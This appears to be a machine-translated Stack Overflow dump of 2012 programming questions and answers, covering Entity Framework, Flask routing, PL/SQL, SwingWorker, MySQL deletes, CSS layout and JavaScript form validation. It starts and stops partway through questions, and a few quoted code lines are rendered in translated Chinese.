        [Required(ErrorMessage = "Item Name is required.")]
        [Column("ItemName")]
        public string Name { get; set; }

        public Int16 RegionID { get; set; }
        public virtual Region Region { get; set; }
    }
} 
```

上下文.cs：

```
using System.Data.Entity;

namespace FFCollection.DAL
{
    public class FullContext : DbContext
    {
        public FullContext() : base("FFCollection") { }

        public DbSet<Item> Items { get; set; }
    }
} 
```

网络配置：

```
<?xml version="1.0" encoding="utf-8"?>

<configuration>

  <connectionStrings>
    <add name="CollectionDB"
          connectionString="Data Source=192.198.0.2; Initial Catalog=FFColection; User ID=; Password=!" />
  </connectionStrings>

  <system.web>
    <compilation debug="true" targetFramework="4.5" />

    <customErrors mode="Off" />

    <httpRuntime targetFramework="4.5" />
  </system.web>
</configuration> 
```

我知道这个地方应该只适合真正有经验的人，他们有多年的经验可以提出问题，但我转向的地方没有帮助，我迷路了，所以请我真的需要一些关于跳到哪里的帮助。如果有人可以帮助我弄清楚为什么没有创建数据库，我可以继续我的代码实验 EF 5.0

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T15:47:23.637

试试这个：

```
<add name="FFColection"
      connectionString="Data Source=192.198.0.2;
                        Initial Catalog=FFColection;
                        User ID=; Password=***;MultipleActiveResultSets=True" 
      providerName="System.Data.SqlClient"/> 
```

构造函数`base("FFCollection")`将字符串参数作为完整的连接字符串或配置文件中的连接字符串的名称。所以它应该是构造函数和名称中的“FFColection”。

可能是服务器地址不够。您可能必须附加 sql server 实例的名称，例如`192.198.0.2\sql2008`（与数据库计算机上的 Sql Server management studio 核对）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T17:39:54.097

编写代码的问题是 EF 在第一次尝试访问它之前不会创建数据库。所以我不得不在我的 index.aspx 页面中添加一些代码来尝试将一个项目添加到数据库中。这导致它创建数据库

# json - 如何从 python 中的文件中读取 JSON 文件列表？

> ID：13537601
> 
> 赞同：1
> 
> 时间：2012-11-24T01:56:50.427
> 
> 标签：json, list, io, python-2.7

我有一个保存到磁盘的 JSON 文件列表，我想阅读这些文件。有时 JSON 文件跨越多行，因此，我认为循环的简单列表理解`open(file,'rb').readlines()`会失败。

这些文件被括在括号中，因此将它们传递给`json.load`或`json.loads`不起作用。

一个示例文件是：

```
[{key:value,key2:value2},{morekeys:morevalues},{evenmorekeys,evenmorevalues}] 
```

当条目跨越多行时，读取保存的 JSON 条目列表的最佳/最 Pythonic 方式是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T02:03:25.857

您的示例是有效的 json。`[]`定义 json 数组。您拥有的是一组对象：

```
with open("myFile.json") as f:
    objects = json.load(f) 
```

# html - Div 不会垂直调整大小以适应文本。没有位置：相对或类似的东西

> ID：13537604
> 
> 赞同：0
> 
> 时间：2012-11-24T01:58:12.957
> 
> 标签：html, resize

我的主体 div 不会调整大小以适合我的文本。

我的设置是一个主体容器 div。在那个 div 中，有 header div、body div 和 footer div。在 body div 中有 3 个 div，分别称为 body-left、body-middle 和 body-right。这些都是使用 css 样式 float:left 并排的

我尝试设置bodycontainer的高度，bodycontainer的最小高度，以及bodycontainer中的div。

这是正在发生的事情的屏幕截图：http: [//i.imgur.com/6dYRf.jpg](http://i.imgur.com/6dYRf.jpg)

这是我的html：

```
<div id="maincontainer">
<div id="headercontainer">
    <a href="/index.html"><div id="header-logo"></div></a>
    <div id="header-navbar">
        <div id="navbar" align="center">
            <a href=""><div>Home</div></a>
            <a href=""><div>Roster</div></a>
            <a href=""><div>FAQ</div></a>
            <a href=""><div>Donate</div></a>
            <a href=""><div>About</div></a>
            <a href=""><div>Contact</div></a>
        </div>
    </div>
</div>
<div id="bodycontainer">
    <div id="body-left">
        <ul>
            <div>
                <a href="http://www.facebook.com/darkonyxftw" title="Click to go to our Facebook page." target="_blank">
                                    <div class="social-odd">
                                    <h3 class="social">Facebook</h3>
                                    <p class="social">All tweets and youtube uploads, as well as updates and notifications go on our facebook. Like our page to get the notifications on your wall.
                                </p>
                                <p class="social">facebook.com/DarkOnyxFTW</p>
                            </div>
                        </a>
                        <a href="http://www.youtube.com/subscription_center?add_user=darkonyxftw" title="Click to subscribe to our Youtube channel." target="_blank">
                                    <div class="social-even">
                                    <h3 class="social">Youtube</h3>
                                    <p class="social">Entire practice sessions, special event videos, VODS and casts get uploaded to our youtube channel. click here to subscribe.
                                </p>
                                <p class="social">youtube.com/DarkOnyxFTW</p>
                            </div>
                      </a>
                      <a href="http://www.twitter.com/DarkOnyxFTW" title="Click to go to our twitter page." target="_blank">
                                    <div class="social-odd">
                                    <h3 class="social">Twitter</h3>
                                    <p class="social">Everytime we upload a youtube video or our stream goes online on twitch.tv/DarkOnyxFTW, you will know about it if you follow our twitter account.
                                </p>
                                <p class="social">twitter.com/DarkOnyxFTW</p>
                            </div>
                        </a>
                        <a href="http://www.twitch.tv/DarkOnyxFTW" title="Click to go to our twitch.tv channel." target="_blank">
                                    <div class="social-even">
                                    <h3 class="social">Live Stream<br>@ Twitch.tv</h3>
                                    <p class="social">We live stream our practices every Monday, Wednesday and Thursday at 7PM PST (9PM Central). Follow our twitch channel to get an email notification when we go live. We will also be streaming clan battles and other special events, so keep an eye on your inbox for that.
                                </p>
                                <p class="social">twitch.tv/DarkOnyxFTW</p>
                            </div>
                        </a>
                        <a href="http://www.teamliquid.net/blog/DarkOnyx" title="Our TeamLiquid Blog" target="_blank">
                                    <div class="social-odd">
                                    <h3 class="social">Team Liquid Blog</h3>
                                    <p class="social">Click here for player interviews, clan war information and much more.
                                </p>
                                <p class="social">teamliquid.net/blog/DarkOnyx</p>
                            </div>
                        </a>
                    </div>
                </ul>
    </div>
    <div id="body-middle">

    </div>
    <div id="body-right">

    </div>
</div>
<div id="footercontainer">
    <div style="width:590px; padding-left:10px; padding-top:10px;">Site by Alex "Xzar" Mohr</div>
    <div id="footer-nav" style="" align="right">
        <ul>
            <li><a href="/about/about.html">About</a></li> | 
            <li><a href="/contact/contact.html">Contact</a></li>
        </ul>
    </div>
</div> 
```

这是我的 CSS：[http ://darkonyx.webatu.com/style2.css](http://darkonyx.webatu.com/style2.css)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T02:04:28.420

```
#bodycontainer{
    width:100%;
    height:1000px;
    background: rgba(0,0,0,0.9);
} 
```

这将高度限制为 1000 像素，小于文本的长度。

# python - 可选的 URL 变量

> ID：13537606
> 
> 赞同：6
> 
> 时间：2012-11-24T01:58:28.053
> 
> 标签：python, url-routing, flask

有没有办法在 Flask 中定义带有可选 URL 参数的 URL？本质上，我想做的是定义允许可选指定语言的规则：

```
/
/de -> matches / (but doesn't collide with /profile)
/profile 
/de/profile 
```

我想我已经找到了一种方法来做到这一点，但这涉及到改变 Werkzeug 和 Flask 处理请求的方式（猴子修补或分叉框架源）。不过，这似乎是处理这个问题的一种过于复杂的方法。有没有更简单的方法可以做到这一点而我忽略了？

**编辑：**

根据布赖恩的回答，这就是我想出的：

**应用程序.py**：

```
from loc import l10n

def create_app(config):                                                                                                                 
    app = Flask(__name__)                                                                                                               
    app.config.from_pyfile(config)                                                                                                      

    bp = l10n.Blueprint()                                                                                                               
    bp.add_url_rule('/', 'home', lambda lang_code: lang_code)                                                                           
    bp.add_url_rule('/profile', 'profile', lambda lang_code: 'profile: %s' % 
        lang_code)
    bp.register_app(app)                                                                                                                

    return app  

if __name__ == '__main__':
    create_app('dev.cfg').run() 
```

**本地/l10ln.py**

```
class Blueprint(Blueprint_):
    def __init__(self):
        Blueprint_.__init__(self, 'loc', __name__)

    def register_app(self, app):
        app.register_blueprint(self, url_defaults={'lang_code': 'en'})                                                                  
        app.register_blueprint(self, url_prefix='/<lang_code>')

        self.app = app 
```

（我还没有`lang_code`从变量列表中提取，但很快就会这样做）

现在这只是热的恕我直言。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-24T02:29:21.323

万一您不知道，您可以为一个视图注册多个路线。为每个视图都这样做可能会很痛苦，但它是可行的......

```
DEFAULT_LANG = 'en'

@app.route('/profile')
@app.route('/<lang>/profile')
def profile(lang=DEFAULT_LANG):
   pass 
```

或者，也许您可​​以实现自己的装饰器，自动为这两种场景`route`调用......`app.route`

```
from flask import Flask

app = Flask(__name__)

DEFAULT_LANG = 'en'

def lang_route(rule, **options):
    def decorator(f):
        endpoint = options.pop('endpoint', None)
        app.add_url_rule(rule, endpoint, f, **options)
        app.add_url_rule('/<lang>%s' % rule, endpoint, f, **options)
        return f
    return decorator

@lang_route('/profile') # also accepts '/<lang>/profile' automatically
def profile(lang=DEFAULT_LANG):
    return lang

if __name__ == '__main__':
    app.run(debug=True) 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-24T02:20:05.927

蓝图可能适用于此，因为它们可以被多次注册。

```
from flask import Flask, Blueprint

app = Flask(__name__)
bp = Blueprint('main', __name__)

@bp.route('/')
def hello(lang):
    return 'Hello ' + lang + '!'

app.register_blueprint(bp, url_defaults={'lang': 'en'})
app.register_blueprint(bp, url_prefix='/<lang>')

if __name__ == '__main__':
    app.run() 
```

如果可行，请参阅Flask 文档中的[国际化蓝图 URL](http://flask.pocoo.org/docs/patterns/urlprocessors/#internationalized-blueprint-urls)，了解避免`lang`在每个视图函数中指定参数的方法。

# stored-procedures - 第 29 行的错误：PL/SQL：语句被忽略

> ID：13537608
> 
> 赞同：1
> 
> 时间：2012-11-24T01:59:32.990
> 
> 标签：stored-procedures, plsql

**包裹**

```
create or replace package PKG_PROJECT AS
type cur IS REF CURSOR;
procedure SP_PREPARESALARY(v_yr in number,v_mn in number);
END PKG_PROJECT; 
```

**包体**

PL/SQL 语句在第 29 行被忽略（就在相关插入查询之前）

```
create or replace package body PKG_PROJECT AS
procedure SP_PREPARESALARY(v_yr in number,v_mn in number) AS
V_EMPNO INTEGER;
V_EMPNAME VARCHAR2(30);
V_BASICSALARY INTEGER;
V_DAYSPRESENT INTEGER;
V_YEAR INTEGER;
V_MONTH INTEGER;
V_PF INTEGER;
V_TAX INTEGER;
V_MON_SAL INTEGER;
V_NET_SAL INTEGER;
V_MAXDAYS INTEGER;
CURSOR EMP_VALUES IS
SELECT EMPNO, EMPNAME, BASICSALARY, YEAR, MONTH, DAYSPRESENT
FROM DELL_EMPLOYEE, DELL_ATTENDANCE
WHERE EMPNO=ENO AND YEAR = V_YR AND MONTH = V_MN;
BEGIN
OPEN EMP_VALUES;
LOOP
FETCH EMP_VALUES INTO V_EMPNO,V_EMPNAME,V_BASICSALARY,V_YEAR,V_MONTH,V_DAYSPRESENT;
EXIT WHEN EMP_VALUES%NOTFOUND;
V_YEAR := V_YR;
V_MONTH := V_MN;
V_MAXDAYS := FN_GETMAXDAYS(V_YEAR,V_MONTH);
V_MON_SAL:= FN_GETGROSSMONTHLYSALARY(V_BASICSALARY, V_DAYSPRESENT, V_MAXDAYS);
V_PF:= FN_GETPF(V_MON_SAL);
V_TAX:= FN_GETTAX(V_MON_SAL,V_PF);
V_NET_SAL:= FN_GETNETSALARY(V_MON_SAL, V_PF, V_TAX);
INSERT INTO DELL_SALARY (EMPNO, YEAR,MONTH,EMPNAME,DAYSPRESENT,BASICSALARY,MONTHSALARY,PF,TAX,NETSALARY)
VALUES (V_EMPNO,V_YEAR,V_MONTH,V_EMPNAME,V_DAYSPRESENT,V_BASICSALARY,V_MON_SAL,
V_PF,V_TAX, V_NET_SAL);
END LOOP;
EXCEPTION
WHEN DUP_VAL_ON_INDEX THEN
UPDATE DELL_SALARY
SET EMPNAME=V_EMPNAME,DAYSPRESENT=V_DAYSPRESENT,BASICSALARY=V_BASICSALARY,
MONTHSALARY=V_MON_SAL,PF=V_PF,TAX=V_TAX,NETSALARY=V_NET_SAL
WHERE EMPNO=V_EMPNO AND YEAR=V_YEAR AND MONTH=V_MONTH;
END SP_PREPARESALARY;
END PKG_PROJECT; 
```

创建了 DELL_EMPLOYEE、DELL_ATTENDANCE、DELL_SALARY 表。但我不知道为什么 kepp 会收到不需要的错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T05:29:30.550

我没有你的功能，所以我已经评论或删除了那部分并创建了你的包，没有任何错误。

```
CREATE OR REPLACE PACKAGE BODY PKG_PROJECT
AS
   PROCEDURE SP_PREPARESALARY (v_yr IN NUMBER, v_mn IN NUMBER)
   AS
      V_EMPNO         VARCHAR2(30);
      V_EMPNAME       VARCHAR2(30);
      V_BASICSALARY   NUMBER;
      V_DAYSPRESENT   NUMBER;
      V_YEAR          NUMBER;
      V_MONTH         NUMBER;
      V_PF            NUMBER;
      V_TAX           NUMBER;
      V_MON_SAL       NUMBER;
      V_NET_SAL       NUMBER;
      V_MAXDAYS       NUMBER;

      CURSOR EMP_VALUES
      IS
         SELECT E.EMPNO,
                E.EMPNAME,
                E.BASICSALARY,
                E.YEAR,
                E.MONTH,
                E.DAYSPRESENT
           FROM DELL_EMPLOYEE E, DELL_ATTENDANCE A
          WHERE E.EMPNO = A.ENO AND E.YEAR = V_YR AND E.MONTH = V_MN;

   BEGIN
      OPEN EMP_VALUES;

      LOOP
         FETCH EMP_VALUES
            INTO V_EMPNO,
                 V_EMPNAME,
                 V_BASICSALARY,
                 V_YEAR,
                 V_MONTH,
                 V_DAYSPRESENT;

         EXIT WHEN EMP_VALUES%NOTFOUND;
         V_YEAR := V_YR;
         V_MONTH := V_MN;
         V_MAXDAYS := 0;
--         V_MON_SAL :=
--            FN_GETGROSSMONTHLYSALARY (V_BASICSALARY,
--                                      V_DAYSPRESENT,
--                                      V_MAXDAYS);
         V_PF := 0;
         V_TAX := 0;
         V_NET_SAL := 0;

--         INSERT INTO DELL_SALARY (EMPNO,
--                                  YEAR,
--                                  MONTH,
--                                  EMPNAME,
--                                  DAYSPRESENT,
--                                  BASICSALARY,
--                                  MONTHSALARY,
--                                  PF,
--                                  TAX,
--                                  NETSALARY)
--              VALUES (V_EMPNO,
--                      V_YEAR,
--                      V_MONTH,
--                      V_EMPNAME,
--                      V_DAYSPRESENT,
--                      V_BASICSALARY,
--                      V_MON_SAL,
--                      V_PF,
--                      V_TAX,
--                      V_NET_SAL);
      END LOOP;
   EXCEPTION
      WHEN DUP_VAL_ON_INDEX
      THEN
      null;
--         UPDATE DELL_SALARY
--            SET EMPNAME = V_EMPNAME,
--                DAYSPRESENT = V_DAYSPRESENT,
--                BASICSALARY = V_BASICSALARY,
--                MONTHSALARY = V_MON_SAL,
--                PF = V_PF,
--                TAX = V_TAX,
--                NETSALARY = V_NET_SAL
--          WHERE EMPNO = V_EMPNO AND YEAR = V_YEAR AND MONTH = V_MONTH;
   END SP_PREPARESALARY;
END PKG_PROJECT; 
```

尝试逐段注释，找出问题出在哪里，这样你就可以很容易地找出问题所在。

# java - JProgressBar 没有触发 setProgress 上的 propertyChange

> ID：13537609
> 
> 赞同：0
> 
> 时间：2012-11-24T01:59:39.827
> 
> 标签：java, swing, swingworker, jprogressbar, propertychangelistener

我已经阅读了许多关于 JProgressBar 的不同文章……包括在 Java 中发现的不可靠的代码；[这里。](http://docs.oracle.com/javase/tutorial/uiswing/components/progress.html "这里")

大多数人表示您需要一个 SwingWorker 才能使事情正常进行，这很有意义，我明白这一点。我发现当我调用 setProgress(value) 来更新进度条时，它大部分时间都不会触发 propertyChange 事件。我检查了我传递给 setProgess 的值，它肯定每次都会改变，所以我不确定它是否只是太快地触发事件？请参阅下面的相关代码，任何帮助/解释将不胜感激。

```
class ProgBar extends SwingWorker
{
    public ProgBar()
    {
        addPropertyChangeListener(new PropertyChangeListener()
        {
           @Override
           public void propertyChange(PropertyChangeEvent evt)
           {
               if ("progress".equals(evt.getPropertyName()))
               {
                   int value = (Integer)evt.getNewValue();
                   System.out.println("propertyChange called with: " + value);
                   loginProg.setValue(value);
               }
           }
        });

        loginProg.setStringPainted(true);
        loginProg.setValue(0);
        setProgress(0);
    }

    @Override
    public Void doInBackground() throws InterruptedException
    {
        ...
        int count = 0;
        for (Folder f : folders)
        {
            ... // process 'f'
            setProgress((int)Math.min(((double)count/folders.length)*100.0, 100.0));
        }
        ...
        return null;
    }

    @Override
    public void done()
    {
        System.out.println("Done called.");
        setProgress(100);
        loginProg.setValue(100);
    }
} 
```

**JProgressBar 用这个调用；**

```
private void jButtonActionPerformed(java.awt.event.ActionEvent evt) 
{                                             
        // Create new thread to run progess bar.
        // Otherwise won't be able to update progress bar.
        ProgBar pb = new ProgBar();
        pb.execute();
    }
} 
```

**编辑：**
是的，所以我应该更好地阅读 Javadocs；

*因为在事件调度线程上异步通知 PropertyChangeListeners，所以在调用任何 PropertyChangeListeners 之前可能会发生对 setProgress 方法的多次调用。出于性能目的，所有这些调用仅与最后一个调用参数合并为一个调用。*

*例如，以下调用：
setProgress(1);
设置进度（2）；
设置进度（3）；*

*可能会导致一个值为 3 的 PropertyChangeListener 通知。*

IE 我认为 setProgress 触发得太快的假设是正确的。ProgressMonitor 可能是更好的解决方案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T03:51:14.727

这不是答案，而是演示[sscce](http://sscce.org)，向您展示我的意思：

```
import java.beans.PropertyChangeEvent;
import java.beans.PropertyChangeListener;
import java.util.Random;

import javax.swing.*;

public class TestProgBar {
   public static void main(String[] args) {
      SwingUtilities.invokeLater(new Runnable() {
         public void run() {
            ProgBar progBar = new ProgBar();

            // **** this is key and where your code may be deficient ***
            JProgressBar prog = progBar.getProg(); 

            progBar.execute();
            JOptionPane.showMessageDialog(null, prog);
         }
      });
   }
}

class ProgBar extends SwingWorker<Void, Void> {
   private JProgressBar loginProg = new JProgressBar();

   public ProgBar() {
      addPropertyChangeListener(new PropertyChangeListener() {

         @Override
         public void propertyChange(PropertyChangeEvent evt) {
            if ("progress".equals(evt.getPropertyName())) {
               int value = (Integer) evt.getNewValue();
               System.out.println("propertyChange called with: " + value);
               loginProg.setValue(value);
            }
         }
      });

      loginProg.setStringPainted(true);
      loginProg.setValue(0);
      setProgress(0);
   }

   public JProgressBar getProg() {
      return loginProg;
   }

   @Override
   public Void doInBackground() throws InterruptedException {
      int count = 0;
      int max = 5;
      Random random = new Random();

      // simulate uploading files
      while (count < 100) {
         count += random.nextInt(max);
         if (count > 100) {
            count = 100;
         }
         setProgress(count);
         Thread.sleep(400);
      }
      // for (Folder f : folders) {
      // setProgress((int) Math.min(((double) count / folders.length) * 100.0,
      // 100.0));
      // }
      return null;
   }

   @Override
   public void done() {
      System.out.println("Done called.");
      setProgress(100);
      loginProg.setValue(100);
   }
} 
```

同样，这段代码工作正常，表明您加载的代码没有显示错误。您需要做进一步的工作*来隔离*错误并将其放入代码中，以便我们对其进行测试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-27T06:54:26.030

是的，所以我应该更好地阅读 Javadocs；

*因为在事件调度线程上异步通知 PropertyChangeListeners，所以在调用任何 PropertyChangeListeners 之前可能会发生对 setProgress 方法的多次调用。出于性能目的，所有这些调用仅与最后一个调用参数合并为一个调用。*

*例如，以下调用：
setProgress(1);
设置进度（2）；
设置进度（3）；
可能会导致一个值为 3 的 PropertyChangeListener 通知。*

IE 我认为 setProgress 触发得太快的假设是正确的。ProgressMonitor 可能是更好的解决方案。我已经用 SSCCE 和我的程序确认了这一点，两者都只是太快地触发了 setProgress，因此，只有传递给 setProgress 的最后一个值被传递给 PropertyChange 事件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-11-18T08:02:00.197

如果您希望立即调用侦听器，可以尝试以下方法（对我有用）：

```
setProgress(1);
firePropertyChange("progress", 0, 1); 
```

# mysql - 如何删除表中多字段的重复项？（mysql）

> ID：13537610
> 
> 赞同：0
> 
> 时间：2012-11-24T01:59:42.340
> 
> 标签：mysql

如果一个表是这样的：

```
id | complains | zipcode
--------------------------
1  |  drinking |  10000
2  |  drinking |  10000
3  |  wasting  |  10000
4  |  wasting  |  10000
5  |  wasting  |  10000
6  |  wasting  |  10011
7  |  wasting  |  10011 
```

我只想得到：

```
---------------
drinking  10000
wasting   10000
wasting   10011
--------------- 
```

我应该如何编写 SQL 查询？我是这样写的，但是在mySQL中不能同时执行update和select。

```
delete from table where id not in (select max(id) from table group by complains, zipcode) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T02:28:36.787

您可以使用子选择来欺骗 MySQL：

```
delete from table 
where id not in 
(
     select * from (select max(id) from table group by complains, zipcode) x
) 
```

# matlab - Matlab子图挤压

> ID：13537611
> 
> 赞同：2
> 
> 时间：2012-11-24T02:00:09.547
> 
> 标签：matlab, plot

我尝试在 Matlab 中生成一个 14 x 5 的子图，但是子图具有方轴，因此在显示时子图不清晰。同样，当我将结果绘制为 pdf 时，子图太小而无法阅读。我怎样才能防止这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T03:03:04.627

如果您不希望您的子图在打印为 pdf 时被挤压，您可以增加打印它们的“纸张”的大小。打印前执行以下代码：

```
set(gcf, 'PaperUnits', 'inches');
set(gcf, 'PaperSize', [12 12]); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T17:44:05.030

尝试使用

```
set(gcf,'PaperPositionMode','auto') 
```

“这确保了印刷版的尺寸与屏幕上的版本相同。” （来自 Matlab 帮助打印）

# javascript - JavaScript 表单验证错误

> ID：13537612
> 
> 赞同：1
> 
> 时间：2012-11-24T02:00:23.413
> 
> 标签：javascript, forms, validation

我正在开发由另一个程序员开发的网站。在 db 中输入数据之前，有一个表单具有 javascript 验证。但我真的不明白为什么我会收到此警报。请参见下面的代码：

```
function save(){
  if (echeck(document.getElementById('email').value)==false){
    document.getElementById('email').focus();
  }else if(document.getElementById('fullname').value==''){
    alert("Full name is required");
    document.getElementById('fullname').focus();
  }else if(document.getElementById('handphone').value==''){
    alert("HP number is required");
    document.getElementById('handphone').focus();
  }else if(document.getElementById('bank_name').value==''){
    alert("Bank Account Name is required");
    document.getElementById('bank_name').focus();
  }else if(document.getElementById('bank_number').value==''){
    alert("Bank Account Number is required");
    document.getElementById('bank_number').focus();
  }else if(document.getElementById('code').value==''){
    alert("Captcha Code cannot be blank");
    document.getElementById('code').focus();
  }else{
    $.post("<?php echo base_url(); ?>index.php/misterjudi/register/", {
      email:document.getElementById('email').value,
      fullname:document.getElementById('fullname').value,
      handphone:document.getElementById('handphone').value,
      bank:document.getElementById('bank').value,
      bank_name:document.getElementById('bank_name').value,
      bank_number:document.getElementById('bank_number').value,
    },
    function(data){
      alert("Successfully registered");
      location.href="<?php echo base_url(); ?>";
    });
  }
} 
```

因此，如果我理解正确，它会检查字段是否不为空。即使我填写了所有字段，我仍然收到类似（'全名'）的警报。

提前感谢您的帮助。

这是HTML代码：

```
<table style="border:0px solid #CCC; width:100%;">
  <tr>
    <td style="padding-bottom:10px; width:180px;">Email
      <span style="color:#F00;">*</span></td><td style="padding-left:20px; padding-bottom:10px;">
      <input id="email" type="text" name="email" onblur="check_email(this.value);" />
    </td>
  </tr>
  <tr>
    <td style="padding-bottom:10px;">Nama <span style="color:#F00;">*</span>
    </td>
    <td style="padding-left:20px; padding-bottom:10px;">
      <input id="fullname" type="text" name="fullname" />
    </td>
  </tr>
  <tr>
    <td style="padding-bottom:10px;">No HP <span style="color:#F00;">*</span>
    </td>
    <td style="padding-left:20px; padding-bottom:10px;">
      <input id="handphone" type="text" name="handphone" />
    </td>
  </tr>
  <tr>
    <td style="padding-bottom:10px;">Nama Bank <span style="color:#F00;">*</span></td>
    <td style="padding-left:20px; padding-bottom:10px;">
      <select name="bank" id="bank">
        <?php $data=$this->dubol_model->get_bank(); ?>
        <?php for($i=0;$i<count($data);$i++){ ?>
        <option value="<?php echo $data[$i]['BankCode']; ?>">
          <?php echo $data[$i]['BankName']; ?></option>
          <?php } ?>
      </select>
    </td>
  </tr>
  <tr>
    <td style="padding-bottom:10px;">Nama Rekening <span style="color:#F00;">*</span></td>
    <td style="padding-left:20px; padding-bottom:10px;"><input id="bank_name" type="text" name="bank_account_name" /></td>
  </tr>
  <tr>
    <td style="padding-bottom:10px;">Nomor Rekening <span style="color:#F00;">*</span></td>
    <td style="padding-left:20px; padding-bottom:10px;">
      <input id="bank_number" type="text" name="bank_account_number" />
    </td>
  </tr>
  <tr>
    <td colspan="2">
      <div style="width: 430px; padding-top:20px; padding-bottom:20px; float: left; height:90px; background-color:#FFF; border:1px solid #CCC;">
        <img id="siimage" align="left" style="padding-right: 5px; border: 0" src="<?php echo base_url(); ?>/captcha/securimage_show.php?sid=<?php echo md5(time()) ?>" />
        <script type="text/javascript">
          AC_FL_RunContent( 'codebase','http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0','width','19','height','19','id','SecurImage_as3','align','middle','src','<?php echo base_url(); ?>/captcha/securimage_play?audio=<?php echo base_url(); ?>/captcha/securimage_play.php&bgColor1=#777&bgColor2=#fff&iconColor=#000&roundedCorner=5','quality','high','bgcolor','#ffffff','name','SecurImage_as3','allowscriptaccess','sameDomain','allowfullscreen','false','pluginspage','http://www.macromedia.com/go/getflashplayer','movie','<?php echo base_url(); ?>/captcha/securimage_play?audio=<?php echo base_url(); ?>/captcha/securimage_play.php&bgColor1=#777&bgColor2=#fff&iconColor=#000&roundedCorner=5' ); //end AC code
        </script>
        <noscript>
          <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0" width="19" height="19" id="SecurImage_as3" align="middle">
            <param name="allowScriptAccess" value="sameDomain" />
            <param name="allowFullScreen" value="false" />
            <param name="movie" value="<?php echo base_url(); ?>/captcha/securimage_play.swf?audio=<?php echo base_url(); ?>/captcha/securimage_play.php&bgColor1=#777&bgColor2=#fff&iconColor=#000&roundedCorner=5" />
            <param name="quality" value="high" />
            <param name="bgcolor" value="#ffffff" />
            <embed src="<?php echo base_url(); ?>/captcha/securimage_play.swf?audio=<?php echo base_url(); ?>/captcha/securimage_play.php&bgColor1=#777&bgColor2=#fff&iconColor=#000&roundedCorner=5" quality="high" bgcolor="#ffffff" width="19" height="19" name="SecurImage_as3" align="middle" allowScriptAccess="sameDomain" allowFullScreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
          </object>
        </noscript><br />
        <!-- pass a session id to the query string of the script to prevent ie caching -->
        <a tabindex="-1" style="border-style: none" href="#" title="Refresh Image" onClick="document.getElementById('siimage').src = '<?php echo base_url(); ?>/captcha/securimage_show.php?sid=' + Math.random(); return false"><img src="<?php echo base_url(); ?>/captcha/images/refresh.gif" alt="Reload Image" border="0" onClick="this.blur()" align="bottom" /></a>
      </div>
    </td>
  </tr>
  <tr>
    <td style="padding-top:10px;">Code <span style="color:#F00;">*</span></td>
    <td style="padding-top:10px;">
      <input id="code" type="text" name="code" size="12" />
    </td>
  </tr>
  <tr>
    <td colspan="2" style="padding-top:20px;">
      <input type="button" value="    Close    " onclick="$('#register').animate({  height: 'toggle', opacity: 'toggle'}, 1000);" />
      <input type="button" value="Register" onclick="save();" />
    </td>
  </tr>
</table> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T02:18:53.813

类型：console.log(document.getElementById('fullname').value, document.getElementById('fullname').value === ''); 在'alert("Fullname is required");'行之前 调试。

此代码将在您的 Web 检查器控制台中打印该输入的值，它是否等于空字符串。我想它会帮助你理解这个问题。

# c# - 在 C# 中获取 .MOV 文件详细信息

> ID：13537613
> 
> 赞同：1
> 
> 时间：2012-11-24T02:00:54.207
> 
> 标签：c#, video, fileinfo

您好，我正在处理视频文件，想了解视频的长度、帧宽和高度以及总比特率。我已经看到了 ID3 标签的解决方案，但它们似乎不适用于电影（.mov 扩展名）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T09:40:34.463

如果该文件可在 DirectShow 中播放，您可以为该文件构建一个管道，并且无需运行它检查管道属性以找出诸如持续时间是分辨率之类的详细信息。此方法并非特定`.MOV`于其他格式，并且适用于其他格式。在 C# 中，您通常通过[DirectShow.NET](http://directshownet.sourceforge.net/)与 DirectShow 交互。

见相关：

*   [使用 DirectShow.net 从 .mov 文件中抓取帧](https://stackoverflow.com/questions/11102241/grab-frame-from-mov-file-using-directshow-net)
*   [使用 DirectShow 获取 MP4 文件的持续时间](https://stackoverflow.com/questions/11346136/getting-mp4-file-duration-with-directshow)
*   [如何通过 C# 从 mp4 媒体文件中获取持续时间](https://stackoverflow.com/questions/7768398/how-to-get-the-duration-from-a-mp4-media-file-by-c-sharp)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T04:19:45.443

查找和下载/购买 ISO/IEC 14496-12（MPEG-4 第 12 部分）

和框（可能`mvhd`还有`tkhd`其他……已经有一段时间了！）将为您提供您正在寻找的信息。MOV 文件格式很容易解析。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T16:09:19.640

在我看来，最好的方法是使用 MediaInfo。它不需要安装任何额外的编解码器等。请参阅我在这篇文章中的回答： [无法加载 MediaInfo 库](https://stackoverflow.com/questions/9561490/unable-to-load-mediainfo-library/9563397#9563397)

# jquery - 使用 jquery.parsejson 使用相同的 json 解析 json 错误

> ID：13537615
> 
> 赞同：0
> 
> 时间：2012-11-24T02:01:17.857
> 
> 标签：jquery, json, parsing

我有两次相同的 json 字符串，但第二次出现错误。

```
{"data":[{"ServerID":"1","UserID":"3","Name":"salzig","State_since":"2012-11-23T23:16:27.458000000","State":"saved","UUID":"Hardware   85f5d278-f6d6-49c2-87e7-c249d8002897"}],"error":[null,null,null]} devcontrol.js:8

{"data":[{"ServerID":"1","UserID":"3","Name":"salzig","State_since":"2012-11-23T23:16:27.458000000","State":"saved","UUID":"Hardware   85f5d278-f6d6-49c2-87e7-c249d8002897"}],"error":[null,null,null]} devcontrol.js:8 
```

